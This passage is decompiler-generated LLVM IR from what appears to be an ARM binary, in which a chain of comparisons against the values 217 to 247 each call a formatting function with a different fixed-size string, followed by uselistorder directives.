dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd48
  %v2_dd54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_dd60 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_dd6c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_dd78 = sext i8 %v3_dd60 to i32
  %v6_dd78 = sext i8 %v3_dd6c to i32
  %v8_dd78 = call i32 @function_92f8(i32 %v2_dd54, i32 ptrtoint ([13 x i8]* @global_var_21ffc.489 to i32), i32 %v4_dd78, i32 %v6_dd78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dd7c

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dd48, %dec_label_pc_dd54
  %v7_dd80 = icmp eq i32 %v2_aef8, 217
  br i1 %v7_dd80, label %dec_label_pc_dd88, label %dec_label_pc_ddb0

dec_label_pc_dd88:                                ; preds = %dec_label_pc_dd7c
  %v2_dd88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_dd94 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_dda0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_ddac = sext i8 %v3_dd94 to i32
  %v6_ddac = sext i8 %v3_dda0 to i32
  %v8_ddac = call i32 @function_92f8(i32 %v2_dd88, i32 ptrtoint ([13 x i8]* @global_var_2200c.491 to i32), i32 %v4_ddac, i32 %v6_ddac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ddb0

dec_label_pc_ddb0:                                ; preds = %dec_label_pc_dd7c, %dec_label_pc_dd88
  %v7_ddb4 = icmp eq i32 %v2_aef8, 218
  br i1 %v7_ddb4, label %dec_label_pc_ddbc, label %dec_label_pc_dde4

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddb0
  %v2_ddbc = ptrtoint i32* %stack_var_-36 to i32
  %v3_ddc8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ddd4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_dde0 = sext i8 %v3_ddc8 to i32
  %v6_dde0 = sext i8 %v3_ddd4 to i32
  %v8_dde0 = call i32 @function_92f8(i32 %v2_ddbc, i32 ptrtoint ([13 x i8]* @global_var_2201c.493 to i32), i32 %v4_dde0, i32 %v6_dde0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dde4

dec_label_pc_dde4:                                ; preds = %dec_label_pc_ddb0, %dec_label_pc_ddbc
  %v7_dde8 = icmp eq i32 %v2_aef8, 219
  br i1 %v7_dde8, label %dec_label_pc_ddf0, label %dec_label_pc_de18

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_dde4
  %v2_ddf0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ddfc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_de08 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_de14 = sext i8 %v3_ddfc to i32
  %v6_de14 = sext i8 %v3_de08 to i32
  %v8_de14 = call i32 @function_92f8(i32 %v2_ddf0, i32 ptrtoint ([14 x i8]* @global_var_2202c.495 to i32), i32 %v4_de14, i32 %v6_de14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de18

dec_label_pc_de18:                                ; preds = %dec_label_pc_dde4, %dec_label_pc_ddf0
  %v7_de1c = icmp eq i32 %v2_aef8, 220
  br i1 %v7_de1c, label %dec_label_pc_de24, label %dec_label_pc_de4c

dec_label_pc_de24:                                ; preds = %dec_label_pc_de18
  %v2_de24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_de30 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_de3c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_de48 = sext i8 %v3_de30 to i32
  %v6_de48 = sext i8 %v3_de3c to i32
  %v8_de48 = call i32 @function_92f8(i32 %v2_de24, i32 ptrtoint ([14 x i8]* @global_var_2203c.497 to i32), i32 %v4_de48, i32 %v6_de48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de18, %dec_label_pc_de24
  %v7_de50 = icmp eq i32 %v2_aef8, 221
  br i1 %v7_de50, label %dec_label_pc_de58, label %dec_label_pc_de80

dec_label_pc_de58:                                ; preds = %dec_label_pc_de4c
  %v2_de58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_de64 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_de70 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_de7c = sext i8 %v3_de64 to i32
  %v6_de7c = sext i8 %v3_de70 to i32
  %v8_de7c = call i32 @function_92f8(i32 %v2_de58, i32 ptrtoint ([14 x i8]* @global_var_2204c.499 to i32), i32 %v4_de7c, i32 %v6_de7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_de80

dec_label_pc_de80:                                ; preds = %dec_label_pc_de4c, %dec_label_pc_de58
  %v7_de84 = icmp eq i32 %v2_aef8, 222
  br i1 %v7_de84, label %dec_label_pc_de8c, label %dec_label_pc_deb4

dec_label_pc_de8c:                                ; preds = %dec_label_pc_de80
  %v2_de8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_de98 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_dea4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_deb0 = sext i8 %v3_de98 to i32
  %v6_deb0 = sext i8 %v3_dea4 to i32
  %v8_deb0 = call i32 @function_92f8(i32 %v2_de8c, i32 ptrtoint ([14 x i8]* @global_var_2205c.501 to i32), i32 %v4_deb0, i32 %v6_deb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de80, %dec_label_pc_de8c
  %v7_deb8 = icmp eq i32 %v2_aef8, 223
  br i1 %v7_deb8, label %dec_label_pc_dec0, label %dec_label_pc_dee8

dec_label_pc_dec0:                                ; preds = %dec_label_pc_deb4
  %v2_dec0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_decc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_ded8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_dee4 = sext i8 %v3_decc to i32
  %v6_dee4 = sext i8 %v3_ded8 to i32
  %v8_dee4 = call i32 @function_92f8(i32 %v2_dec0, i32 ptrtoint ([14 x i8]* @global_var_2206c.503 to i32), i32 %v4_dee4, i32 %v6_dee4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_dee8

dec_label_pc_dee8:                                ; preds = %dec_label_pc_deb4, %dec_label_pc_dec0
  %v7_deec = icmp eq i32 %v2_aef8, 224
  br i1 %v7_deec, label %dec_label_pc_def4, label %dec_label_pc_df1c

dec_label_pc_def4:                                ; preds = %dec_label_pc_dee8
  %v2_def4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_df00 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_df0c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_df18 = sext i8 %v3_df00 to i32
  %v6_df18 = sext i8 %v3_df0c to i32
  %v8_df18 = call i32 @function_92f8(i32 %v2_def4, i32 ptrtoint ([14 x i8]* @global_var_2207c.505 to i32), i32 %v4_df18, i32 %v6_df18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_df1c

dec_label_pc_df1c:                                ; preds = %dec_label_pc_dee8, %dec_label_pc_def4
  %v7_df20 = icmp eq i32 %v2_aef8, 225
  br i1 %v7_df20, label %dec_label_pc_df28, label %dec_label_pc_df50

dec_label_pc_df28:                                ; preds = %dec_label_pc_df1c
  %v2_df28 = ptrtoint i32* %stack_var_-36 to i32
  %v3_df34 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_df40 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_df4c = sext i8 %v3_df34 to i32
  %v6_df4c = sext i8 %v3_df40 to i32
  %v8_df4c = call i32 @function_92f8(i32 %v2_df28, i32 ptrtoint ([13 x i8]* @global_var_2208c.507 to i32), i32 %v4_df4c, i32 %v6_df4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_df50

dec_label_pc_df50:                                ; preds = %dec_label_pc_df1c, %dec_label_pc_df28
  %v7_df54 = icmp eq i32 %v2_aef8, 226
  br i1 %v7_df54, label %dec_label_pc_df5c, label %dec_label_pc_e118

dec_label_pc_df5c:                                ; preds = %dec_label_pc_df50
  %v2_df5c = ptrtoint i32* %stack_var_-36 to i32
  %v3_df68 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_df74 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_df80 = sext i8 %v3_df68 to i32
  %v6_df80 = sext i8 %v3_df74 to i32
  %v8_df80 = call i32 @function_92f8(i32 %v2_df5c, i32 ptrtoint ([13 x i8]* @global_var_2209c.509 to i32), i32 %v4_df80, i32 %v6_df80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e118

dec_label_pc_e118:                                ; preds = %dec_label_pc_df50, %dec_label_pc_df5c
  %v7_e11c = icmp eq i32 %v2_aef8, 227
  br i1 %v7_e11c, label %dec_label_pc_e124, label %dec_label_pc_e14c

dec_label_pc_e124:                                ; preds = %dec_label_pc_e118
  %v2_e124 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e130 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e13c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e148 = sext i8 %v3_e130 to i32
  %v6_e148 = sext i8 %v3_e13c to i32
  %v8_e148 = call i32 @function_92f8(i32 %v2_e124, i32 ptrtoint ([14 x i8]* @global_var_220ac.511 to i32), i32 %v4_e148, i32 %v6_e148, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e14c

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e118, %dec_label_pc_e124
  %v7_e150 = icmp eq i32 %v2_aef8, 228
  br i1 %v7_e150, label %dec_label_pc_e158, label %dec_label_pc_e180

dec_label_pc_e158:                                ; preds = %dec_label_pc_e14c
  %v2_e158 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e164 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e170 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e17c = sext i8 %v3_e164 to i32
  %v6_e17c = sext i8 %v3_e170 to i32
  %v8_e17c = call i32 @function_92f8(i32 %v2_e158, i32 ptrtoint ([14 x i8]* @global_var_220bc.514 to i32), i32 %v4_e17c, i32 %v6_e17c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e180

dec_label_pc_e180:                                ; preds = %dec_label_pc_e14c, %dec_label_pc_e158
  %v7_e184 = icmp eq i32 %v2_aef8, 229
  br i1 %v7_e184, label %dec_label_pc_e18c, label %dec_label_pc_e1b4

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e180
  %v2_e18c = ptrtoint i32* %stack_var_-36 to i32
  %v3_e198 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e1a4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e1b0 = sext i8 %v3_e198 to i32
  %v6_e1b0 = sext i8 %v3_e1a4 to i32
  %v8_e1b0 = call i32 @function_92f8(i32 %v2_e18c, i32 ptrtoint ([14 x i8]* @global_var_220cc.516 to i32), i32 %v4_e1b0, i32 %v6_e1b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e1b4

dec_label_pc_e1b4:                                ; preds = %dec_label_pc_e180, %dec_label_pc_e18c
  %v7_e1b8 = icmp eq i32 %v2_aef8, 230
  br i1 %v7_e1b8, label %dec_label_pc_e1c0, label %dec_label_pc_e1e8

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e1b4
  %v2_e1c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e1cc = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e1d8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e1e4 = sext i8 %v3_e1cc to i32
  %v6_e1e4 = sext i8 %v3_e1d8 to i32
  %v8_e1e4 = call i32 @function_92f8(i32 %v2_e1c0, i32 ptrtoint ([14 x i8]* @global_var_220dc.518 to i32), i32 %v4_e1e4, i32 %v6_e1e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1b4, %dec_label_pc_e1c0
  %v7_e1ec = icmp eq i32 %v2_aef8, 231
  br i1 %v7_e1ec, label %dec_label_pc_e1f4, label %dec_label_pc_e21c

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1e8
  %v2_e1f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e200 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e20c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e218 = sext i8 %v3_e200 to i32
  %v6_e218 = sext i8 %v3_e20c to i32
  %v8_e218 = call i32 @function_92f8(i32 %v2_e1f4, i32 ptrtoint ([14 x i8]* @global_var_220ec.520 to i32), i32 %v4_e218, i32 %v6_e218, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e21c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e1e8, %dec_label_pc_e1f4
  %v7_e220 = icmp eq i32 %v2_aef8, 232
  br i1 %v7_e220, label %dec_label_pc_e228, label %dec_label_pc_e250

dec_label_pc_e228:                                ; preds = %dec_label_pc_e21c
  %v2_e228 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e234 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e240 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e24c = sext i8 %v3_e234 to i32
  %v6_e24c = sext i8 %v3_e240 to i32
  %v8_e24c = call i32 @function_92f8(i32 %v2_e228, i32 ptrtoint ([14 x i8]* @global_var_220fc.522 to i32), i32 %v4_e24c, i32 %v6_e24c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e250

dec_label_pc_e250:                                ; preds = %dec_label_pc_e21c, %dec_label_pc_e228
  %v7_e254 = icmp eq i32 %v2_aef8, 233
  br i1 %v7_e254, label %dec_label_pc_e25c, label %dec_label_pc_e284

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e250
  %v2_e25c = ptrtoint i32* %stack_var_-36 to i32
  %v3_e268 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e274 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e280 = sext i8 %v3_e268 to i32
  %v6_e280 = sext i8 %v3_e274 to i32
  %v8_e280 = call i32 @function_92f8(i32 %v2_e25c, i32 ptrtoint ([14 x i8]* @global_var_2210c.524 to i32), i32 %v4_e280, i32 %v6_e280, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e284

dec_label_pc_e284:                                ; preds = %dec_label_pc_e250, %dec_label_pc_e25c
  %v7_e288 = icmp eq i32 %v2_aef8, 234
  br i1 %v7_e288, label %dec_label_pc_e290, label %dec_label_pc_e2b8

dec_label_pc_e290:                                ; preds = %dec_label_pc_e284
  %v2_e290 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e29c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e2a8 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e2b4 = sext i8 %v3_e29c to i32
  %v6_e2b4 = sext i8 %v3_e2a8 to i32
  %v8_e2b4 = call i32 @function_92f8(i32 %v2_e290, i32 ptrtoint ([14 x i8]* @global_var_2211c.526 to i32), i32 %v4_e2b4, i32 %v6_e2b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e284, %dec_label_pc_e290
  %v7_e2bc = icmp eq i32 %v2_aef8, 235
  br i1 %v7_e2bc, label %dec_label_pc_e2c4, label %dec_label_pc_e2ec

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2b8
  %v2_e2c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e2d0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e2dc = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e2e8 = sext i8 %v3_e2d0 to i32
  %v6_e2e8 = sext i8 %v3_e2dc to i32
  %v8_e2e8 = call i32 @function_92f8(i32 %v2_e2c4, i32 ptrtoint ([13 x i8]* @global_var_2212c.528 to i32), i32 %v4_e2e8, i32 %v6_e2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e2ec

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2b8, %dec_label_pc_e2c4
  %v7_e2f0 = icmp eq i32 %v2_aef8, 236
  br i1 %v7_e2f0, label %dec_label_pc_e2f8, label %dec_label_pc_e320

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2ec
  %v2_e2f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e304 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e310 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e31c = sext i8 %v3_e304 to i32
  %v6_e31c = sext i8 %v3_e310 to i32
  %v8_e31c = call i32 @function_92f8(i32 %v2_e2f8, i32 ptrtoint ([13 x i8]* @global_var_2213c.530 to i32), i32 %v4_e31c, i32 %v6_e31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e320

dec_label_pc_e320:                                ; preds = %dec_label_pc_e2ec, %dec_label_pc_e2f8
  %v7_e324 = icmp eq i32 %v2_aef8, 237
  br i1 %v7_e324, label %dec_label_pc_e32c, label %dec_label_pc_e354

dec_label_pc_e32c:                                ; preds = %dec_label_pc_e320
  %v2_e32c = ptrtoint i32* %stack_var_-36 to i32
  %v3_e338 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e344 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e350 = sext i8 %v3_e338 to i32
  %v6_e350 = sext i8 %v3_e344 to i32
  %v8_e350 = call i32 @function_92f8(i32 %v2_e32c, i32 ptrtoint ([13 x i8]* @global_var_2214c.532 to i32), i32 %v4_e350, i32 %v6_e350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %dec_label_pc_e320, %dec_label_pc_e32c
  %v7_e358 = icmp eq i32 %v2_aef8, 238
  br i1 %v7_e358, label %dec_label_pc_e360, label %dec_label_pc_e388

dec_label_pc_e360:                                ; preds = %dec_label_pc_e354
  %v2_e360 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e36c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e378 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e384 = sext i8 %v3_e36c to i32
  %v6_e384 = sext i8 %v3_e378 to i32
  %v8_e384 = call i32 @function_92f8(i32 %v2_e360, i32 ptrtoint ([13 x i8]* @global_var_2215c.534 to i32), i32 %v4_e384, i32 %v6_e384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e388

dec_label_pc_e388:                                ; preds = %dec_label_pc_e354, %dec_label_pc_e360
  %v7_e38c = icmp eq i32 %v2_aef8, 239
  br i1 %v7_e38c, label %dec_label_pc_e394, label %dec_label_pc_e3bc

dec_label_pc_e394:                                ; preds = %dec_label_pc_e388
  %v2_e394 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e3a0 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e3ac = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e3b8 = sext i8 %v3_e3a0 to i32
  %v6_e3b8 = sext i8 %v3_e3ac to i32
  %v8_e3b8 = call i32 @function_92f8(i32 %v2_e394, i32 ptrtoint ([13 x i8]* @global_var_2216c.536 to i32), i32 %v4_e3b8, i32 %v6_e3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e388, %dec_label_pc_e394
  %v7_e3c0 = icmp eq i32 %v2_aef8, 240
  br i1 %v7_e3c0, label %dec_label_pc_e3c8, label %dec_label_pc_e3f0

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e3bc
  %v2_e3c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e3d4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e3e0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e3ec = sext i8 %v3_e3d4 to i32
  %v6_e3ec = sext i8 %v3_e3e0 to i32
  %v8_e3ec = call i32 @function_92f8(i32 %v2_e3c8, i32 ptrtoint ([13 x i8]* @global_var_2217c.538 to i32), i32 %v4_e3ec, i32 %v6_e3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3bc, %dec_label_pc_e3c8
  %v7_e3f4 = icmp eq i32 %v2_aef8, 241
  br i1 %v7_e3f4, label %dec_label_pc_e3fc, label %dec_label_pc_e424

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3f0
  %v2_e3fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_e408 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e414 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e420 = sext i8 %v3_e408 to i32
  %v6_e420 = sext i8 %v3_e414 to i32
  %v8_e420 = call i32 @function_92f8(i32 %v2_e3fc, i32 ptrtoint ([14 x i8]* @global_var_2218c.540 to i32), i32 %v4_e420, i32 %v6_e420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e424

dec_label_pc_e424:                                ; preds = %dec_label_pc_e3f0, %dec_label_pc_e3fc
  %v7_e428 = icmp eq i32 %v2_aef8, 242
  br i1 %v7_e428, label %dec_label_pc_e430, label %dec_label_pc_e458

dec_label_pc_e430:                                ; preds = %dec_label_pc_e424
  %v2_e430 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e43c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e448 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e454 = sext i8 %v3_e43c to i32
  %v6_e454 = sext i8 %v3_e448 to i32
  %v8_e454 = call i32 @function_92f8(i32 %v2_e430, i32 ptrtoint ([13 x i8]* @global_var_2219c.542 to i32), i32 %v4_e454, i32 %v6_e454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e458

dec_label_pc_e458:                                ; preds = %dec_label_pc_e424, %dec_label_pc_e430
  %v7_e45c = icmp eq i32 %v2_aef8, 243
  br i1 %v7_e45c, label %dec_label_pc_e464, label %dec_label_pc_e48c

dec_label_pc_e464:                                ; preds = %dec_label_pc_e458
  %v2_e464 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e470 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e47c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e488 = sext i8 %v3_e470 to i32
  %v6_e488 = sext i8 %v3_e47c to i32
  %v8_e488 = call i32 @function_92f8(i32 %v2_e464, i32 ptrtoint ([13 x i8]* @global_var_221ac.544 to i32), i32 %v4_e488, i32 %v6_e488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e48c

dec_label_pc_e48c:                                ; preds = %dec_label_pc_e458, %dec_label_pc_e464
  %v7_e490 = icmp eq i32 %v2_aef8, 244
  br i1 %v7_e490, label %dec_label_pc_e498, label %dec_label_pc_e4c0

dec_label_pc_e498:                                ; preds = %dec_label_pc_e48c
  %v2_e498 = ptrtoint i32* %stack_var_-36 to i32
  %v3_e4a4 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e4b0 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e4bc = sext i8 %v3_e4a4 to i32
  %v6_e4bc = sext i8 %v3_e4b0 to i32
  %v8_e4bc = call i32 @function_92f8(i32 %v2_e498, i32 ptrtoint ([13 x i8]* @global_var_221bc.546 to i32), i32 %v4_e4bc, i32 %v6_e4bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e4c0

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e48c, %dec_label_pc_e498
  %v7_e4c4 = icmp eq i32 %v2_aef8, 245
  br i1 %v7_e4c4, label %dec_label_pc_e4cc, label %dec_label_pc_e4f4

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4c0
  %v2_e4cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_e4d8 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e4e4 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e4f0 = sext i8 %v3_e4d8 to i32
  %v6_e4f0 = sext i8 %v3_e4e4 to i32
  %v8_e4f0 = call i32 @function_92f8(i32 %v2_e4cc, i32 ptrtoint ([13 x i8]* @global_var_221cc.548 to i32), i32 %v4_e4f0, i32 %v6_e4f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e4c0, %dec_label_pc_e4cc
  %v7_e4f8 = icmp eq i32 %v2_aef8, 246
  %v2_e500 = ptrtoint i32* %stack_var_-36 to i32
  br i1 %v7_e4f8, label %dec_label_pc_e500, label %dec_label_pc_e528

dec_label_pc_e500:                                ; preds = %dec_label_pc_e4f4
  %v3_e50c = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e518 = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e524 = sext i8 %v3_e50c to i32
  %v6_e524 = sext i8 %v3_e518 to i32
  %v8_e524 = call i32 @function_92f8(i32 %v2_e500, i32 ptrtoint ([13 x i8]* @global_var_221dc.550 to i32), i32 %v4_e524, i32 %v6_e524, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e528

dec_label_pc_e528:                                ; preds = %dec_label_pc_e4f4, %dec_label_pc_e500
  %v7_e52c = icmp eq i32 %v2_aef8, 247
  br i1 %v7_e52c, label %dec_label_pc_e534, label %dec_label_pc_e55c

dec_label_pc_e534:                                ; preds = %dec_label_pc_e528
  %v3_e540 = load i8, i8* @global_var_2c8a9.52, align 1
  %v3_e54c = load i8, i8* @global_var_2c8aa.53, align 1
  %v4_e558 = sext i8 %v3_e540 to i32
  %v6_e558 = sext i8 %v3_e54c to i32
  %v8_e558 = call i32 @function_92f8(i32 %v2_e500, i32 ptrtoint ([13 x i8]* @global_var_221ec.552 to i32), i32 %v4_e558, i32 %v6_e558, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_e55c

dec_label_pc_e55c:                                ; preds = %dec_label_pc_e528, %dec_label_pc_e534
  store i32 %v2_e500, i32* @r0, align 4
  %v1_e564 = call i32 @function_14830(i32 %v2_e500)
  store i32 %v3_ad58, i32* @fp, align 4
  ret i32 %v1_e564

; uselistorder directives
  uselistorder i32 %v2_e500, { 1, 0, 2, 3 }
  uselistorder i32 %v2_aef8, { 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_aec4, { 1, 0 }
  uselistorder i32 %v6_ae78, { 2, 1, 0 }
  uselistorder i32 %v6_ae2c, { 2, 1, 0 }
  uselistorder i32 %v6_ade0, { 2, 1, 0 }
  uselistorder i32 %v6_ad94, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_21d04.393 to i32), { 1, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 51, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_2c8a6.49 to i32), { 1, 2, 3, 4, 0 }
